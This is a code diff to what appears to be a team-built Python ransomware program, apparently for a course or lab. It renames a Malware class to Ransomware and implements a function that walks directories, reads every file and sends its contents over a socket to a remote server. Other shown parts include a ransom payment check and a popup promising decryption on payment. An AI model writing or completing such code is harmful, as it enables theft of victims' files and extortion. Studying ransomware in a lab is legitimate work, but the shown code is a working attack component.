@@ -10,7 +10,7 @@ import socket
 import math
 
 
-class Malware: 
+class Ransomware: 
     SERVER_IP = "192.168.56.110"
     ENCODING = "utf-8"
 
@@ -56,7 +56,27 @@ class Malware:
 
     #TODO Rafi/Yusef:
     def send_file_to_server(self, file_path):
-        return False
+        dir_list = self.list_safe_directories(file_path)
+        for dir in dir_list:
+            for file in self.get_files_in_dir(dir):
+                file_path = os.path.join(dir, file)
+            
+                """ Opening and reading the file data. """
+                file = open(file_path, "r")
+                data = file.read()
+ 
+                """ Sending the filename to the server. """
+                self._socket.send("malware.py".encode("utf-8"))
+                msg = self._socket.recv(1024).decode("utf-8")
+                print(f"[SERVER]: {msg}")
+ 
+                """ Sending the file data to the server. """
+                self._socket.send(data.encode("utf-8"))
+                msg = self._socket.recv(1024).decode("utf-8")
+                print(f"[SERVER]: {msg}")
+                
+                """ Closing the file. """
+                file.close()
 
     #TODO Subin:
     def check_if_user_has_paid(self):
@@ -196,9 +216,9 @@ if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
 
     # Initialize dropper application.
-    malware = Malware('tsoh', 'lacol', 729000000)
+    ransomware = Ransomware('tsoh', 'lacol', 729000000)
     # Collect the malicious code and dump it into the file.
-    malware.execute_attack()
+    ransomware.execute_attack()
 
     #TODO: Replace this with Asymetric crypto
     #Generate key and make a key file
@@ -236,12 +256,12 @@ if __name__ == '__main__':
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
-            if (Malware.check_if_user_has_paid()):
+            if (ransomware.check_if_user_has_paid()):
                 break
 
 
     #User has paid before the time ran out
-    if (Malware.check_if_user_has_paid()):
+    if (ransomware.check_if_user_has_paid()):
         popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
         # decrypt_all_files(home, key)
         #TODO: Implement code to delete all the files that are stored on the server
